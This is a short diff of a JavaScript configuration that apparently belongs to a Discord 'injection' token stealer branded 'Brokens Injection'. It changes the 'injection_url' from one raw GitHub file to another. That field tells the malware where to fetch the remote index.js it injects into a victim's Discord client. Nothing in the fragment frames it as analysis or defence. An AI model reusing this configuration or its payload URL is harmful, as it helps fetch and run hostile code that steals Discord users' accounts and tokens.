@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Brokens Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1079581844233797694/1082013976105320459/a_982b04545c242a56322ddbdd457e61fe.gif'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/octopus-warriorss/asdadasd/main/index.js', 
   /**
    
    **/
